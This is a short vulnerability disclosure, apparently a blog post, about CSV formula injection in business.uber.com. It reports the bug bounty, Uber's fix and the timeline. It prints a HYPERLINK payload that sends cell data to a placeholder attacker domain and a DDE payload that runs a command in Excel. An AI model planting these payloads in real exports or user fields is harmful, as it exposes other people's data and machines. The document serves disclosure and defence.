<!-- 
.. title: CSV Injection in business.uber.com
.. slug: csv-injection-in-businessubercom
.. date: 2016-04-17 19:30:03 UTC-04:00
.. tags: 
.. category: 
.. link: 
.. description: 
.. type: text
-->

```business.uber.com``` allows for names to begin with a ```=``` which allows for injection of formulas into the downloaded CSVs. There are two main ways that this can be exploited: 

1. It allows for data exfiltration through HYPERLINKs
2. It allows for code execution on the user's machine provided that they trust Uber

1 can be done by setting one's username to something of the form:  ```"=HYPERLINK("https://maliciousDomain.com/evil.html?data="&A1, "Click to view additional information")"```. This will create a cell that will show the text "Click to view additional information" but when clicked will send the data in A1 to ```maliciousDomain.com```. 

2 can be done by setting one's username to something of the form: ```=cmd|' /C calc'!A0``` (this will open Windows calculator). If a CSV contains a command like the above, excel will warn the user with two different pop up boxes. The problem is that these boxes ask the user whether they "trust the source of" the file. Since most users will trust Uber as a source, they will click through both of these warnings without worry. 

![firstBox](/firstBox.png)

![secondBox](/secondBox.png)

While it is true that one needs to be an admin on the business page in order to change the username, this still qualifies as a vulnerability (and not simply a self-CSV-injection) since there can be multiple admins. This allows for one admin to get code execution on another admin's computer through the download CSV function. 

Uber patched this by prepending a ```'``` to any names starting with ```=```, ```+```, ```-```. 

I reported this to Uber's bug bounty on March 25th, it was triaged on the 28th, and patched on the 30th. A 1000 dollar bounty was awarded on April 6th. You can see the original report [here](https://hackerone.com/reports/126109). 

